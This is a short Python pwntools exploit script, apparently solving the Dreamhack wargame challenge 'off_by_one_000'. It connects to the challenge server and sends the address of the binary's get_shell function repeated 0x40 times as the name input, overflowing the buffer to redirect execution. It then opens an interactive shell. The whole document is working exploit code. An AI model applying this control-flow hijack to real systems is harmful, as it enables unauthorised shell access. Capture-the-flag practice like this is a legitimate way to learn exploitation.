from pwn import *

p = remote('host3.dreamhack.games', 19662)
e = ELF('./off_by_one_000')

get_shell = e.symbols['get_shell']

payload = p32(get_shell) * 0x40

p.sendafter(b'Name: ', payload)

p.interactive()